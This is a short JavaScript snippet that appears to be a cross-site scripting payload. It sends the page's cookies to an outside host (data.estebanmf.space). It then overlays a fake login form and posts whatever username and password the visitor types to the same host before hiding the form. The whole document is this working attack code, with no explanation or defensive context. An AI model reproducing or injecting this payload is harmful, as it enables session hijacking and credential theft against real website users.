fetch('https://data.estebanmf.space/cookies', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ cookies: document.cookie })
});
var d = document.createElement('div');
d.innerHTML = '<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:10px;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.5);"><form id="c"><input id="u" placeholder="Username"><input type="password" id="p" placeholder="Password"><button type="submit">OK</button></form></div>';
document.body.appendChild(d);
document.getElementById('c').onsubmit = function(e) {
  e.preventDefault();
  fetch('https://data.estebanmf.space/credentials', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: document.getElementById('u').value, password: document.getElementById('p').value })
  }).then(r => r.text()).then(() => { d.remove() });
};
